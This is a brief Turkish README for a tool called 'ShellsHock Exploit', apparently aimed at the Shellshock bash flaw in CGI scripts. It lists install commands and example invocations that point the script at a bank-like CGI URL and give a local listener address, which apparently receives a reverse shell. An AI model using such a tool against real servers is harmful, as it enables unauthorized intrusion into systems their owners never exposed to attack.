# ShellsHock Exploit

## Kurulum

    apt install git
    apt install python
    git clone https://github.com/ASER-VANT/ShellsHock.git
    cd ShellsHock
    pip install -r requirements.txt
  
## Tek Komutla Kurulum

    apt install git && apt install python3 && git clone https://github.com/ASER-VANT/ShellsHock.git && cd ShellsHock && pip install -r requirements.txt

## Kullanımı

    python3 shellshock.py --help

Yardım Ekranı (Lütfen Okuyunuz)

    python3 shellshock.py -u http://xbank.com/cgi-bin/test -l 192.168.1.150

Yada

    python3 shellshock.py --url http://xbank.com/cgi-bin/test --lhost 192.168.1.150
